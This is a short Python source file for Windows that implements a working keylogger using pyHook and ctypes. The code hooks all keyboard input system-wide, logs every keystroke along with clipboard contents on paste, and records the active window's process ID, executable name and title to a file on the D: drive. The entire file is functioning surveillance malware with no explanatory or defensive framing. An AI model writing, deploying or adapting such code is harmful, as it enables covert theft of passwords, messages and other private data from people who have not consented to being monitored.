#coding=utf-8

from ctypes import *
import pyHook
import pythoncom
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

f = open("d:\logs.txt",'w+')

def get_current_process():
	hwnd = user32.GetForegroundWindow()
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))
	process_id = "%d" % pid.value
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
	psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
	windows_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)
	f.write("[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value))
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def KeyStroke(event):
	global current_window
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()
	if event.Ascii > 32 and event.Ascii < 127:
		f.write(chr(event.Ascii))
		f.flush(),
	else:
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			f.write("[PASTE]-%s" % (pasted_value))
			f.flush(),
		else:
			f.write("[%s]" % event.Key)
			f.flush(),
	return True

kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

kl.HookKeyboard()
pythoncom.PumpMessages()